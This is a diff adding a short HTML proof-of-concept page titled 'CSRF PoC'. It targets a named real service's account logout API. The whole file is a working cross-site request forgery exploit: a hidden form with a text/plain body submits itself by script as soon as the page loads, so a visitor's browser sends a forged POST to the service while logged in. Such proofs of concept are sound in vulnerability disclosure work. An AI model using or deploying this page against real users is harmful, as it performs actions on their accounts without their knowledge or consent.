@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF PoC</title>
+</head>
+<body>
+
+<form id="csrf"
+      action="https://account-api.playerauctions.com/api/SignIn/Logout"
+      method="POST"
+      enctype="text/plain">
+    <input type="hidden" name="{}" value="">
+</form>
+
+<script>
+    document.getElementById("csrf").submit();
+</script>
+
+</body>
+</html>
